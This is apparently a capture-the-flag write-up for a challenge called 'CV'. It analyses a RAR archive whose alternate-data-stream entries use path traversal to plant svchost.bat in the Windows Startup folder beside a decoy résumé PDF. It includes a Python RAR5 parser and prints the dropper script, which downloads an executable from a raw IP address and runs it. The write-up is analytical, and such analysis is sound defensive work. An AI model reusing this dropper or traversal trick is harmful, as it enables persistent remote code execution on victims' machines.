# CV

## Description

It is advisable to solve the task in an isolated Windows environment!

[exploit.rar](https://dgactf.com/files/30a73102b3c2e183a3eba6221689ab3f/exploit.rar?token=eyJ1c2VyX2lkIjoyMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTR9.aZyPTw.NZlhPz-5KjYcS8q70J-iN_LjN7Y)

## Solution

```bash
└─$ file Anton_Pekhnichek_CV_2026.pdf
Anton_Pekhnichek_CV_2026.pdf: PDF document, version 1.4, 1 page(s)

└─$ exiftool Anton_Pekhnichek_CV_2026.pdf
ExifTool Version Number         : 13.44
File Name                       : Anton_Pekhnichek_CV_2026.pdf
Directory                       : .
File Size                       : 1673 bytes
File Modification Date/Time     : 2026:02:23 04:51:12-05:00
File Access Date/Time           : 2026:02:23 12:36:58-05:00
File Inode Change Date/Time     : 2026:02:23 12:36:26-05:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Author                          : (anonymous)
Create Date                     : 2026:02:23 01:51:12-08:00
Creator                         : (unspecified)
Modify Date                     : 2026:02:23 01:51:12-08:00
Producer                        : ReportLab PDF Library - (opensource)
Subject                         : (unspecified)
Title                           : (anonymous)
Trapped                         : False
Page Mode                       : UseNone
Page Count                      : 1
```

Parse PDF

::: details pdf-parser.out
```bash
└─$ pdf-parser Anton_Pekhnichek_CV_2026.pdf
PDF Comment '%PDF-1.4\n'

PDF Comment '%\x93\x8c\x8b\x9e ReportLab Generated PDF document (opensource)\n'

obj 1 0
 Type: 
 Referencing: 2 0 R, 3 0 R

  <<
    /F1 2 0 R
    /F2 3 0 R
  >>


obj 2 0
 Type: /Font
 Referencing: 

  <<
    /BaseFont /Helvetica
    /Encoding /WinAnsiEncoding
    /Name /F1
    /Subtype /Type1
    /Type /Font
  >>


obj 3 0
 Type: /Font
 Referencing: 

  <<
    /BaseFont /Helvetica-Bold
    /Encoding /WinAnsiEncoding
    /Name /F2
    /Subtype /Type1
    /Type /Font
  >>


obj 4 0
 Type: /Page
 Referencing: 8 0 R, 7 0 R, 1 0 R

  <<
    /Contents 8 0 R
    /MediaBox [ 0 0 612 792 ]
    /Parent 7 0 R
    /Resources
      <<
        /Font 1 0 R
        /ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
      >>
    /Rotate 0
    /Trans
    /Type /Page
  >>


obj 5 0
 Type: /Catalog
 Referencing: 7 0 R

  <<
    /PageMode /UseNone
    /Pages 7 0 R
    /Type /Catalog
  >>


obj 6 0
 Type: 
 Referencing: 

  <<
    /Author '(\\(anonymous\\))'
    /CreationDate "(D:20260223015112-08'00')"
    /Creator '(\\(unspecified\\))'
    /Keywords ()
    /ModDate "(D:20260223015112-08'00')"
    /Producer '(ReportLab PDF Library - \\(opensource\\))'
    /Subject '(\\(unspecified\\))'
    /Title '(\\(anonymous\\))'
    /Trapped /False
  >>


obj 7 0
 Type: /Pages
 Referencing: 4 0 R

  <<
    /Count 1
    /Kids [ 4 0 R ]
    /Type /Pages
  >>


obj 8 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Filter [ /ASCII85Decode /FlateDecode ]
    /Length 271
  >>


xref

PDF Comment '% ReportLab generated PDF document -- digest (opensource)\n\n'

trailer
  <<
    /ID [<d8a9858dc1377c2c81c6dfa3ddd20b45><d8a9858dc1377c2c81c6dfa3ddd20b45>]
    /Info 6 0 R
    /Root 5 0 R
    /Size 9
  >>

startxref 1282

PDF Comment '%%EOF\n'
```
:::

Extract all streams
```bash
└─$ for ((i=0;i<11;i++));do pdf-parser -o "$i" -f -O -c -d "stream_$i.bin" Anton_Pekhnichek_CV_2026.pdf; done;
└─$ file stream_*
stream_1.bin: empty
stream_2.bin: empty
stream_3.bin: empty
stream_4.bin: empty
stream_5.bin: empty
stream_6.bin: empty
stream_7.bin: empty
stream_8.bin: ASCII text

└─$ cat stream_8.bin
1 0 0 1 0 0 cm  BT /F1 12 Tf 14.4 TL ET
q
1 0 0 1 78 692 cm
q
0 0 0 rg
BT 1 0 0 1 0 4 Tm /F2 18 Tf 22 TL 41.988 0 Td (ANTON PEKHNICHEK - SENIOR ENGINEER) Tj T* -41.988 0 Td ET
Q
Q
q
1 0 0 1 78 674 cm
Q
q
1 0 0 1 78 662 cm
q
0 0 0 rg
BT 1 0 0 1 0 2 Tm /F1 10 Tf 12 TL (Experience in cloud security and automated deployment.) Tj T* ET
Q
Q
```

I randomly decided to open given rar in 7zip and saw this

![cv.png](/assets/ctf/dgactf/cv.png)

File
```bash
C:\Users\...\exploit.rar\Anton_Pekhnichek_CV_2026.pdf:..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat
```

```bash
└─$ 7z x -snl 0.rar

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:3 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 4801 bytes (5 KiB)

Extracting archive: 0.rar
--
Path = 0.rar
Type = Rar5
Physical Size = 4801
Characteristics = Locator QuickOpen:0
Encrypted = -
Solid = -
Blocks = 11
Method = v6:128K:m3
Multivolume = -
Volumes = 1

ERROR: Unsupported Method : Anton_Pekhnichek_CV_2026.pdf
ERROR: Unsupported Method : Anton_Pekhnichek_CV_2026.pdf:..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat
...
ERROR: Unsupported Method : Anton_Pekhnichek_CV_2026.pdf:..\..\..\..\..\..\..\..\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat

Sub items Errors: 11

Archives with Errors: 1

Sub items Errors: 11
```

- [CVE-2025-6218-WinRAR-Directory-Traversal-RCE](https://github.com/absholi7ly/CVE-2025-6218-WinRAR-Directory-Traversal-RCE)

This didn't work :(
- [rarADSExtractor](https://github.com/tasox/rarADSExtractor)

So...

::: details solver.py
```python
import argparse
import binascii
import re
import struct
from dataclasses import dataclass


def ve(v):
    """Encode integer as RAR5 variable-length integer."""
    r = bytearray()
    while True:
        b = v & 0x7F
        v >>= 7
        if v:
            b |= 0x80
        r.append(b)
        if not v:
            break
    return bytes(r)


def vd(data, offset):
    """Decode RAR5 vint at offset, return (value, new_offset)."""
    val = 0
    shift = 0
    while True:
        b = data[offset]
        val |= (b & 0x7F) << shift
        shift += 7
        offset += 1
        if not (b & 0x80):
            break
    return val, offset


def hdr(payload):
    """Build RAR5 header: CRC32 + payload."""
    crc = binascii.crc32(payload) & 0xFFFFFFFF
    return struct.pack('<I', crc) + payload


def parse_extra_area(raw, offset, size):
    """Parse extra area records, return dict of {type: data}."""
    records = {}
    end = offset + size
    while offset < end:
        rec_size, offset = vd(raw, offset)
        rec_start = offset
        rec_type, offset = vd(raw, offset)
        rec_data = raw[offset:rec_start + rec_size]
        records[rec_type] = rec_data
        offset = rec_start + rec_size
    return records


@dataclass
class Entry:
    type: int
    name: str
    data_offset: int
    data_size: int
    unpack_size: int
    data_crc: int
    comp_info: int
    stream_name: str


def parse_rar5(raw):
    """Parse all RAR5 headers and yield Entry objects."""
    assert raw[:8] == b'Rar!\x1a\x07\x01\x00', "Not a RAR5 archive"
    pos = 8

    while pos < len(raw):
        if pos + 7 > len(raw):
            break
        pos += 4
        hdr_size, pos = vd(raw, pos)
        body_end = pos + hdr_size

        hdr_type, p = vd(raw, pos)
        hdr_flags, p = vd(raw, p)

        extra_size = 0
        data_size = 0
        if hdr_flags & 0x01:
            extra_size, p = vd(raw, p)
        if hdr_flags & 0x02:
            data_size, p = vd(raw, p)

        if hdr_type == 5:
            break

        name = ""
        unpack_size = 0
        data_crc = 0
        comp_info = 0
        stream_name = ""

        if hdr_type in (2, 3):
            file_flags, p = vd(raw, p)
            unpack_size, p = vd(raw, p)
            _attrib, p = vd(raw, p)
            if file_flags & 0x02:
                p += 4
            if file_flags & 0x04:
                data_crc = struct.unpack_from('<I', raw, p)[0]
                p += 4
            comp_info, p = vd(raw, p)
            _host_os, p = vd(raw, p)
            name_len, p = vd(raw, p)
            name = raw[p:p + name_len].decode('utf-8', errors='replace')
            p += name_len

            if extra_size > 0:
                extra_records = parse_extra_area(raw, body_end - extra_size, extra_size)
                if 7 in extra_records:
                    sn = extra_records[7].rstrip(b'\x00').decode('utf-8', errors='replace')
                    stream_name = sn

        data_offset = body_end
        yield Entry(
            type=hdr_type,
            name=name,
            data_offset=data_offset,
            data_size=data_size,
            unpack_size=unpack_size,
            data_crc=data_crc,
            comp_info=comp_info,
            stream_name=stream_name,
        )
        pos = body_end + data_size


def filename_from_stream(stream_name):
    r"""Extract a safe filename from an ADS stream path like ':..\..\..\path\to\file.bat'."""
    cleaned = stream_name.lstrip(':')
    basename = cleaned.replace('\\', '/').rsplit('/', 1)[-1]
    basename = re.sub(r'[<>:"/\\|?*]', '_', basename)
    return basename or 'extracted'


def default_filename(entry):
    if entry.stream_name:
        return filename_from_stream(entry.stream_name)
    if entry.name and entry.type == 2:
        return entry.name
    return "extracted.bin"


def build_single_file_rar(raw, entry, filename):
    cd = raw[entry.data_offset:entry.data_offset + entry.data_size]
    fname = filename.encode("utf-8")
    body = (
        ve(2)                               +  # type: file header
        ve(0x02)                            +  # flags: data area present
        ve(len(cd))                         +  # data size
        ve(0x04)                            +  # file flags: CRC32 present
        ve(entry.unpack_size)               +  # unpacked size
        ve(0x20)                            +  # attributes
        struct.pack("<I", entry.data_crc)   +  # data CRC32
        ve(entry.comp_info)                 +  # compression info
        ve(0)                               +  # host OS
        ve(len(fname))                      +  # name length
        fname                                  # file name
    )
    fhdr = hdr(ve(len(body)) + body)
    eoa = hdr(ve(2) + ve(5) + ve(0))
    return raw[:24] + fhdr + cd + eoa


def select_target(parser, entries, index):
    if index is not None:
        if index < 0 or index >= len(entries):
            parser.error(f"Index {index} out of range (0-{len(entries)-1})")
        target = entries[index]
        if target.data_size == 0:
            parser.error(f"Entry [{index}] has no data area")
        return target

    stm = [entry for entry in entries if entry.type == 3 and entry.data_size > 0]
    if not stm:
        parser.error("No STM service headers with data found. Use -l to inspect.")
    return stm[0]


def print_entries(path, raw, entries):
    type_names = {1: 'MAIN', 2: 'FILE', 3: 'SERVICE', 4: 'CRYPT', 5: 'END'}
    print(f"[+] {path} ({len(raw)} bytes) — {len(entries)} entries\n")
    for index, entry in enumerate(entries):
        tn = type_names.get(entry.type, f"UNK({entry.type})")
        line = ( # Pwetty format
            f"[{index:2d}] {tn:8s} name={entry.name!r} "
            f"data={entry.data_size}B unpack={entry.unpack_size}B "
            f"crc=0x{entry.data_crc:08x} comp=0x{entry.comp_info:x}"
        )
        if entry.stream_name:
            line += f" stream={entry.stream_name!r}"
        print(line)


def build_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('input', help="Path to the RAR5 archive containing ADS entries")
    parser.add_argument('-l', '--list', action='store_true', help="List all headers and exit")
    parser.add_argument('-e', '--entry', type=int, default=None, help="Entry index to extract (default: first STM)")
    parser.add_argument('-o', '--output', default=None, help="Output RAR5 path (default: <filename>.rar)")
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    with open(args.input, 'rb') as f:
        raw = f.read()

    entries = list(parse_rar5(raw))

    if args.list:
        print_entries(args.input, raw, entries)
        return

    target = select_target(parser, entries, args.entry)
    filename = default_filename(target)
    out_rar = args.output or f"{filename}.rar"
    out = build_single_file_rar(raw, target, filename)

    with open(out_rar, 'wb') as f:
        f.write(out)

    print(f"[+] Extracted entry: {target.name!r} "
          f"({target.data_size}B -> {target.unpack_size}B)")
    if target.stream_name:
        print(f"    Stream: {target.stream_name}")
    print(f"[+] Created {out_rar} ({len(out)} bytes)")
    print(f"    Extract with: unrar x {out_rar}")


if __name__ == '__main__':
    main()
```
:::

```bash
└─$ py parse.py exploit.rar -l
[+] exploit.rar (4801 bytes) — 12 entries

[ 0] MAIN     name='' data=0B unpack=0B crc=0x00000000 comp=0x0
[ 1] FILE     name='Anton_Pekhnichek_CV_2026.pdf' data=928B unpack=1673B crc=0x33844828 comp=0x180
[ 2] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 3] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 4] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 5] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 6] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 7] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 8] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[ 9] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[10] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'
[11] SERVICE  name='STM' data=215B unpack=280B crc=0x2fc7f629 comp=0x180 stream=':..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat'

└─$ py parse.py exploit.rar
[+] Extracted entry: 'STM' (215B -> 280B)
    Stream: :..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.bat
[+] Created svchost.bat.rar (278 bytes)
    Extract with: unrar x svchost.bat.rar
```

```bash
└─$ unrar x svchost.bat.rar
└─$ cat svchost.bat
@echo off
echo Downloading file...
set URL=http://139.162.181.199:8080/systemCleaner.exe
set OUTPUT=%~dp0systemCleaner.exe
curl -L -o "%OUTPUT%" "%URL%"
if %ERRORLEVEL% NEQ 0 (
    echo Download failed!
    pause
    exit /b 1
)
echo Running...
"%OUTPUT%"
echo Done!
```

```bash
└─$ curl http://139.162.181.199:8080/systemCleaner.exe -LO
```

![cv-1.png](/assets/ctf/dgactf/cv-1.png)

```cs
private static readonly string KEY = "h1H3nEohnw4JH4Be2ktO7Dhd1BKGK9TF6hQanZ8SsvE=";
private static readonly string IV = "Fpr8D2OGhYXz5iBGceFGaA==";
private static readonly string CT = "gJajGh+bSGx24BsT1wKUj/TwZyrH6280dhzGMVSAKa0=";
```

- [Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'h1H3nEohnw4JH4Be2ktO7Dhd1BKGK9TF6hQanZ8SsvE%3D'%7D,%7B'option':'Base64','string':'Fpr8D2OGhYXz5iBGceFGaA%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Z0phakdoK2JTR3gyNEJzVDF3S1VqL1R3WnlySDYyODBkaHpHTVZTQUthMD0)

![cv-2.png](/assets/ctf/dgactf/cv-2.png)

::: tip Flag
`DGA{CVE-2025-B0BB_5E3MS_US3FUL}`
:::

